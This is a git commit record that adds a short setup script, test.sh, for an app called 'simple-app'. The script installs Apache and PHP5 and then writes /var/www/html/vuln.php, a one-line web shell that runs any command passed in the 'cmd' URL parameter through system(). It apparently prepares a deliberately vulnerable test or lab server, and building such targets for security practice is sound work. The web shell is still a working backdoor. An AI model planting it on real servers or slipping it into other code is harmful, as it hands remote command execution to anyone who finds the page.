c05f989d341bdb0977f6566c9f25d49795e3ccf8
d05004 <ded05004@naver.com>
2023-05-09 16:34:31 +0900

    simple-app

---
+++ simple-app/test.sh
@@ -0,0 +1,17 @@
+#!/bin/sh
+
+echo "script start" >> /tmp/result
+#echo "nameserver 8.8.8.8" >> /etc/resolv.conf
+#echo "nameserver 8.8.4.4" >> /etc/resolv.conf
+#echo "nameserver 8.8.8.8 8.8.4.4" >> /etc/network/interfaces
+
+apt-get update -y
+apt-get install apache2 -y
+apt-get install -y php5
+
+cat << EOF > /var/www/html/vuln.php
+<?php
+echo system(\$_GET['cmd']);
+?>
+
+EOF
